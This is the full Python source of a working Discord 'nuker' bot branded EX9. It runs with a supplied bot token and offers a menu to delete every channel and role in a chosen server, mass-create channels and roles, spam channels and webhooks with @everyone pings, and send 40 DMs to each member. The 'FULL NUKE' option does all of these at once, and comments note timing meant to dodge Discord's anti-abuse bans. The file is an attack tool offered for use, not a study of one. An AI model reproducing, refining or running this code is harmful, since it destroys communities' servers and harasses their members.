import discord
from discord.ext import commands
import asyncio
import os
import sys
import logging
from colorama import Fore, Style, init

logging.basicConfig(level=logging.CRITICAL)
logging.getLogger('discord').setLevel(logging.CRITICAL)

init(autoreset=True)

BANNER = f"""
{Fore.CYAN}
      :::::::::: :::    :::  :::::::: 
     :+:         :+:    :+: :+:    :+: 
    +:+          +:+  +:+  +:+    +:+  
   +#++:++#      +#++:+   +#++:++#++   
  +#+          +#+  +#+         +#+    
 #+#         #+#    #+# #+#    #+#     
########## ###    ###  ########        

{Fore.RED}       [ EX9 ULTRA TURBO NUKER ]
{Fore.WHITE}   ---------------------------------
"""

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

async def get_input(prompt):
    return await asyncio.to_thread(input, f"{Fore.CYAN}{prompt}{Fore.WHITE}")

@bot.event
async def on_ready():
    clear()
    print(BANNER)
    print(f"{Fore.GREEN}[+] Connected as: {bot.user}")
    guilds = list(bot.guilds)
    if not guilds:
        print(f"{Fore.RED}[!] The bot is not in any server!"); sys.exit()
    for i, guild in enumerate(guilds):
        print(f"{Fore.WHITE}[{i}] - {guild.name}")
    try:
        choice = await get_input("\nSelect Server Number: ")
        target_guild = guilds[int(choice)]
        await main_menu(target_guild)
    except Exception as e:
        print(f"{Fore.RED}Error: {e}"); await asyncio.sleep(2); await on_ready()

async def mass_dm(member):
    # إرسال 40 رسالة لكل عضو في الخاص بسرعة
    msg = "✞𝐄𝐗𝟗┆𝐄𝐗𝟗 𝐓𝐞𝐚𝐦 𝐨𝐧 𝐭𝐨𝐩"
    for _ in range(40):
        try:
            await member.send(msg)
            # تأخير بسيط جداً لتجنب حظر البوت فوراً من ديسكورد
            await asyncio.sleep(0.01) 
        except:
            break

async def main_menu(guild):
    while True:
        clear()
        print(BANNER)
        print(f"{Fore.RED}Target: {Fore.WHITE}{guild.name}")
        print(f"""
{Fore.YELLOW}[1] {Fore.WHITE}Change Name    {Fore.YELLOW}[2] {Fore.WHITE}Create Channels {Fore.YELLOW}[3] {Fore.WHITE}Create Roles
{Fore.YELLOW}[4] {Fore.WHITE}Delete Channels{Fore.YELLOW}[5] {Fore.WHITE}Delete Roles   {Fore.YELLOW}[6] {Fore.WHITE}Webhook Spam
{Fore.YELLOW}[7] {Fore.WHITE}Custom Spam
{Fore.RED}[8] FULL NUKE (EX9 STYLE + MASS DM)
{Fore.YELLOW}[0] Exit
        """)
        op = await get_input("Choice: ")
        try:
            if op == '1':
                name = await get_input("New Name: ")
                await guild.edit(name=name)
            elif op == '2':
                name = await get_input("Name: ")
                amount = int(await get_input("Amount: "))
                tasks = [guild.create_text_channel(name=name) for _ in range(amount)]
                await asyncio.gather(*tasks, return_exceptions=True)
            elif op == '3':
                name = await get_input("Name: ")
                amount = int(await get_input("Amount: "))
                tasks = [guild.create_role(name=name) for _ in range(amount)]
                await asyncio.gather(*tasks, return_exceptions=True)
            elif op == '4':
                tasks = [ch.delete() for ch in guild.channels]
                await asyncio.gather(*tasks, return_exceptions=True)
            elif op == '5':
                tasks = [role.delete() for role in guild.roles if role.name != "@everyone"]
                await asyncio.gather(*tasks, return_exceptions=True)
            elif op == '6':
                ch_id = int(await get_input("Channel ID: "))
                msg = await get_input("Message: ")
                count = int(await get_input("Amount: "))
                channel = bot.get_channel(ch_id)
                if channel:
                    wb = await channel.create_webhook(name="EX9 ON TOP")
                    tasks = [wb.send(msg) for _ in range(count)]
                    await asyncio.gather(*tasks, return_exceptions=True)
            elif op == '7':
                msg = await get_input("Message: ")
                count = int(await get_input("Times: "))
                for ch in guild.text_channels:
                    for _ in range(count): asyncio.create_task(ch.send(msg))
            elif op == '8':
                print(f"{Fore.RED}[!!!] EX9 NUKE INITIATED...")
                # حل مشكلة الـ SequenceProxy بجمع القوائم يدوياً
                all_channels = list(guild.channels)
                all_roles = [r for r in guild.roles if r.name != "@everyone"]
                
                # حذف كل شيء
                del_tasks = [obj.delete() for obj in all_channels + all_roles]
                await asyncio.gather(*del_tasks, return_exceptions=True)
                
                n_name = "✞𝐄𝐗𝟗┆𝐄𝐗𝟗 𝐓𝐞𝐚𝐦 𝐨𝐧 𝐭𝐨𝐩"
                n_msg = "**𝐄𝐗𝟗 𝐨𝐧 𝐭𝐨𝐩 @everyone × @here **"
                
                # إرسال رسائل خاص لجميع الأعضاء (Mass DM)
                print(f"{Fore.YELLOW}[!] Starting Mass DM to all members...")
                dm_tasks = [mass_dm(member) for member in guild.members if not member.bot]
                asyncio.gather(*dm_tasks, return_exceptions=True)

                async def do_nuke():
                    try:
                        ch = await guild.create_text_channel(name=n_name)
                        for _ in range(10): asyncio.create_task(ch.send(n_msg))
                    except: pass

                n_tasks = [do_nuke() for _ in range(60)]
                r_tasks = [guild.create_role(name=n_name) for _ in range(40)]
                await asyncio.gather(*(n_tasks + r_tasks), return_exceptions=True)
            elif op == '0':
                sys.exit()
            await get_input("\n[+] Done! Press Enter...")
        except Exception as e:
            print(f"{Fore.RED}Error: {e}"); await asyncio.sleep(2)

if __name__ == "__main__":
    clear()
    print(BANNER)
    token = input(f"{Fore.CYAN}Enter Bot Token: {Fore.WHITE}")
    try:
        bot.run(token)
    except Exception as e:
        print(f"{Fore.RED}Login Failed: {e}")
